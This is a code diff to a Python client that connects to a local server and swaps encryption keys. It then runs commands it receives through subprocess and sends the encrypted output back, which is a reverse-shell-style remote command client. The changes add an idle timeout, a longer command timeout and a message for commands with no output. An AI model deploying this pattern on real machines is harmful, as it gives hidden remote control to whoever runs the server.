@@ -27,6 +27,8 @@ class Client(Thread):
                                                               errors='ignore')  # Receiving the AES key encrypted in RSA.
                 res = encrypt_client(os.getcwd().encode('ISO-8859-1', errors='ignore'), self.AES_KEY)
                 self.conn.send(res)
+                self.start_time = time.time()
+                self.timer = Thread(target=self.check_time).start()
                 break
             except Exception:
                 continue
@@ -60,6 +62,7 @@ class Client(Thread):
         while True:
             try:
                 command = decrypt_client(self.conn.recv(1024), self.AES_KEY)
+                self.start_time = time.time()
                 print(command)
             except ConnectionResetError:
                 self.__init__(self.IP, self.Port)
@@ -157,8 +160,10 @@ class Client(Thread):
                                                stderr=subprocess.PIPE
                                                )
                         print(CMD)
-                        output, errors = CMD.communicate(timeout=1)
+                        output, errors = CMD.communicate(timeout=15)
                         new_output = output + errors
+                        if new_output == '':
+                            new_output = 'No output came from this command'
                         self.conn.send(
                             encrypt_client(
                                 str(len(encrypt_client(new_output,
@@ -173,7 +178,11 @@ class Client(Thread):
                                                        self.AES_KEY))).encode(
                                     'ISO-8859-1', errors='ignore'), self.AES_KEY))
                         self.conn.send(encrypt_client(new_output, self.AES_KEY))
-
+    def check_time(self):
+        while True:
+            if time.time() - self.start_time > 120:
+                self.conn.shutdown(socket.SHUT_RDWR)
+                exit()
 
 def main():
     client = Client("127.0.0.1", 9999)
